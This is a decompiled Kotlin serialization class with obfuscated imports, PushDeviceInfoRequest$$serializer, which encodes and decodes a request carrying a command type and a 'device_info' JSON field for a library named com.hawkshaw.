package com.hawkshaw.library.datalayer.models;

import B3.m;
import D3.a;
import D3.b;
import E3.C0029h0;
import E3.H;
import E3.q0;
import F3.v;
import Y1.K;
import com.hawkshaw.library.datalayer.models.Command;
import kotlinx.serialization.KSerializer;
import kotlinx.serialization.descriptors.SerialDescriptor;
import kotlinx.serialization.encoding.Decoder;
import kotlinx.serialization.encoding.Encoder;
import kotlinx.serialization.internal.PluginGeneratedSerialDescriptor;
import kotlinx.serialization.json.c;

public final class PushDeviceInfoRequest$$serializer implements H {
    public static final PushDeviceInfoRequest$$serializer INSTANCE;
    private static final /* synthetic */ PluginGeneratedSerialDescriptor descriptor;

    static {
        PushDeviceInfoRequest$$serializer pushDeviceInfoRequest$$serializer = new PushDeviceInfoRequest$$serializer();
        INSTANCE = pushDeviceInfoRequest$$serializer;
        PluginGeneratedSerialDescriptor pluginGeneratedSerialDescriptor = new PluginGeneratedSerialDescriptor("com.hawkshaw.library.datalayer.models.PushDeviceInfoRequest", pushDeviceInfoRequest$$serializer, 2);
        pluginGeneratedSerialDescriptor.l("type", false);
        pluginGeneratedSerialDescriptor.l("device_info", false);
        descriptor = pluginGeneratedSerialDescriptor;
    }

    private PushDeviceInfoRequest$$serializer() {
    }

    public KSerializer[] childSerializers() {
        return new KSerializer[]{PushDeviceInfoRequest.$childSerializers[0], v.f660a};
    }

    public PushDeviceInfoRequest deserialize(Decoder decoder) {
        K.n(decoder, "decoder");
        SerialDescriptor descriptor2 = getDescriptor();
        a a5 = decoder.a(descriptor2);
        KSerializer[] access$get$childSerializers$cp = PushDeviceInfoRequest.$childSerializers;
        boolean z4 = true;
        int i5 = 0;
        Command.PushDeviceInfoRequest.Type type = null;
        c cVar = null;
        while (z4) {
            int y4 = a5.y(descriptor2);
            if (y4 == -1) {
                z4 = false;
            } else if (y4 == 0) {
                type = (Command.PushDeviceInfoRequest.Type) a5.l(descriptor2, 0, access$get$childSerializers$cp[0], type);
                i5 |= 1;
            } else if (y4 == 1) {
                cVar = (c) a5.l(descriptor2, 1, v.f660a, cVar);
                i5 |= 2;
            } else {
                throw new m(y4);
            }
        }
        a5.c(descriptor2);
        return new PushDeviceInfoRequest(i5, type, cVar, (q0) null);
    }

    public SerialDescriptor getDescriptor() {
        return descriptor;
    }

    public void serialize(Encoder encoder, PushDeviceInfoRequest pushDeviceInfoRequest) {
        K.n(encoder, "encoder");
        K.n(pushDeviceInfoRequest, "value");
        SerialDescriptor descriptor2 = getDescriptor();
        b a5 = encoder.a(descriptor2);
        PushDeviceInfoRequest.write$Self$library_release(pushDeviceInfoRequest, a5, descriptor2);
        a5.c(descriptor2);
    }

    public KSerializer[] typeParametersSerializers() {
        return C0029h0.f501b;
    }
}
